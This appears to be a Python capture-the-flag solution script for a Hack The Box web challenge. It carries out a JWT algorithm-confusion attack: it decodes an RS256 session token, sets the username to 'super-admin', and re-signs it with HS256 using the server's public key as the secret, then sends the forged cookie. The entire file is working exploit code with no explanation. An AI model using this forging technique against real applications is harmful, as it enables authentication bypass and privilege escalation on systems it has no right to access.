import requests
import jwt


URL = 'http://docker.hackthebox.eu:30260/'
URL_LOGIN = URL+'auth'

key = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n'

headers = {
    'Host': 'docker.hackthebox.eu',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Origin': URL
}

def decode_jwt(token, alg='RS256'):
	return jwt.decode(token, key, algorithms=[alg])

def encode_jwt(decode_token):
	return str(jwt.encode(decode_token, key, algorithm='HS256'), 'utf-8')

def try_login(username, password):
	headers['Content-Type'] = 'application/x-www-form-urlencoded'
	datapost = 'username=%s&password=%s&login=Login' % (username, password)
	rq = requests.post(url=URL_LOGIN, data=datapost, headers=headers, allow_redirects=False)
	cookies = rq.headers.get('Set-Cookie')
	token = cookies.replace('session=', '').split(';')[0]
	decode_token = decode_jwt(token)
	print(' -+-+- TOKEN DECODE -+-+-\n%s' % decode_token)
	decode_token['username'] = "super-admin"
	print(' =-=-= MODIFY TOKEN =-=-=')
	encode_token = str(jwt.encode(decode_token, key, algorithm='HS256'),'utf-8')
	print(' -+-+- TOKEN DECODE -+-+-\n%s' % decode_jwt(encode_token, 'HS256'))
	cookie = {'session': encode_token}
	del headers['Content-Type']
	rq = requests.get(url=URL, headers=headers, cookies=cookie)
	print(rq.text)

if __name__ == '__main__':
	try_login('admin', 'admin')
